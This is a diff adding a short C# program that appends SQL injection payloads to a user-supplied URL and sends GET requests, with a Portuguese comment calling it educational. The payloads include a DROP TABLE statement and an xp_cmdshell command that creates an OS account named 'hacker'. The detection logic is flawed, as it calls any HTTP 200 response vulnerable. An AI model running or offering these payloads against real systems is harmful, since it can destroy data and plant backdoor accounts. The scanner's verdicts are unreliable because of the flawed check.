@@ -1,0 +1,62 @@
+ using System;
+using System.Net;
+using System.IO;
+
+namespace SQLServerInjectionCheck
+{
+class Program
+{
+static void Main(string[] args)
+{
+// URL of the web page to test
+string url = "";
+Console.WriteLine("Enter the url to test: ");
+url = Console.ReadLine();
+
+// SQL injection test strings
+string[] testStrings =
+{
+"' OR 1=1--",
+"'; DROP TABLE table_name;--",
+"' UNION SELECT * FROM table_name",
+"' OR 'a'='a",
+"admin' --",
+"' AND 1=0 UNION SELECT * FROM table_name",
+"' OR 1=1 /*",
+"'; EXEC master..xp_cmdshell 'net user hacker password /add'--",
+"' OR email IS NOT NULL--",
+"' OR 'a'='a' AND (SELECT COUNT(*) FROM table_name) = 0--"
+};
+
+// Loop through each test string
+for (int i = 0; i < testStrings.Length; i++)
+{
+string fullUrl = url + testStrings[i];
+
+try
+{
+// Send a GET request to the web page
+HttpWebRequest request = (HttpWebRequest)WebRequest.Create(fullUrl);
+request.Method = "GET";
+HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+
+if (response.StatusCode == HttpStatusCode.OK)
+{
+Console.WriteLine("Test string " + (i+1) + ": VULNERABLE to SQL injection attack - URL:" + fullUrl);
+}
+else
+{
+Console.WriteLine("Test string " + (i+1) + ": Not VULNERABLE to SQL injection attack");
+}
+}
+catch (WebException ex)
+{
+Console.WriteLine("Error:" + ex.Message);
+}
+}
+Console.WriteLine("SQL injection test completed");
+}
+}
+}
+
+//Este script solicita ao usuário a url do site que deseja verificar, em seguida, cria uma matriz com diferentes cargas de injeção SQL, constrói uma nova url usando a url original e a carga útil, envia uma solicitação GET para o site e verifica se o código de status da resposta está OK ou não. Se o código estiver OK, o script imprimirá uma mensagem informando que a url é vulnerável ao ataque de injeção SQL com a carga útil que foi usada, caso contrário, imprimirá uma mensagem informando que a url não está vulnerável à carga útil específica, depois de testar todas as cargas úteis, ele imprimirá que o teste foi concluído. Observe que este script é apenas para fins educacionais e de demonstração e não é uma solução completa para verificar vulnerabilidades de injeção de SQL em um site, pois depende da resposta do site.
